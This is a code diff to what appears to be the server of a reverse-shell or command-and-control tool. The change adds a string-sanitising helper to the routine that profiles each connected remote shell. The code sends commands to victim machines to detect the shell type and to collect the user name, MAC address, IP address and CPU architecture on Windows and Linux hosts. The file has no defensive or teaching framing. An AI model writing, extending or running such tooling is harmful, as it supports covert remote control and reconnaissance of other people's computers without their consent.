@@ -21,6 +21,12 @@ def ouiSearch(mac:str):
             
     return "unknown"
 
+def sanitize(string:str):
+    """
+    sanitize string of \\x03 and strip
+    """
+    return string.replace("\x03", "").strip()
+
 class shellServer:
     def __init__(self, mgrs, skt) -> None:
         self.clients = {}
@@ -95,7 +101,7 @@ class shellServer:
         windows = False
 
         # harvest info
-        shell = sendCmd("fasdsadf", uid, False)
+        shell = sanitize(sendCmd("fasdsadf", uid, False))
         if "not found" in shell:
             harvestedInfo["shelltype"] = 'bash'
             harvestedInfo["os"] = "Linux"
@@ -117,21 +123,21 @@ class shellServer:
         info("[REMOTE] {} is {}".format(uid, harvestedInfo["shelltype"]))
 
         # hostname
-        harvestedInfo["hostname"] = sendCmd("whoami", uid, False)
+        harvestedInfo["hostname"] = sanitize(sendCmd("whoami", uid, False))
 
         if windows:
             if harvestedInfo["shelltype"] == "powershell":
-                harvestedInfo['mac'] = sendCmd("Get-NetAdapter | Where-Object { $_.InterfaceAlias -eq (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceAlias } | Select-Object -ExpandProperty MacAddress", uid, False).replace("-", ":")
-                harvestedInfo['ip'] = sendCmd("$mainInterface = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceIndex; (Get-NetIPAddress | Where-Object { $_.InterfaceIndex -eq $mainInterface -and $_.AddressFamily -eq 'IPv4' }).IPAddress", uid, False)
-                harvestedInfo['arch'] = "x86" if sendCmd("(Get-WmiObject -Class Win32_Processor).Architecture", uid, False) == "0" else "x64"
+                harvestedInfo['mac'] = sanitize(sendCmd("Get-NetAdapter | Where-Object { $_.InterfaceAlias -eq (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceAlias } | Select-Object -ExpandProperty MacAddress", uid, False).replace("-", ":"))
+                harvestedInfo['ip'] = sanitize(sendCmd("$mainInterface = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceIndex; (Get-NetIPAddress | Where-Object { $_.InterfaceIndex -eq $mainInterface -and $_.AddressFamily -eq 'IPv4' }).IPAddress", uid, False))
+                harvestedInfo['arch'] = "x86" if sanitize(sendCmd("(Get-WmiObject -Class Win32_Processor).Architecture", uid, False)) == "0" else "x64"
             else:
                 harvestedInfo['mac'] = "idk"
                 harvestedInfo['ip'] = "idk"
                 harvestedInfo['arch'] = "probably x64"
         else:
-            harvestedInfo['mac'] = sendCmd("ip -o link | awk '$2 != \"lo:\" {print $2, $(NF-2)}'", uid, False).split("\n")[0].split(": ")[-1]
-            harvestedInfo['ip'] = sendCmd("ip route get 1 | awk '{print $NF; exit}'", uid, False)
-            harvestedInfo['arch'] = sendCmd("lscpu | awk '/Architecture/ {print $2}'", uid, False)
+            harvestedInfo['mac'] = sanitize(sendCmd("ip -o link | awk '$2 != \"lo:\" {print $2, $(NF-2)}'", uid, False).split("\n")[0].split(": ")[-1])
+            harvestedInfo['ip'] = sanitize(sendCmd("ip route get 1 | awk '{print $NF; exit}'", uid, False))
+            harvestedInfo['arch'] = sanitize(sendCmd("lscpu | awk '/Architecture/ {print $2}'", uid, False))
 
         harvestedInfo['firstSeen'] = datetime.datetime.now().strftime("%H:%M")
         harvestedInfo['lastActive'] = datetime.datetime.now().strftime("%H:%M")
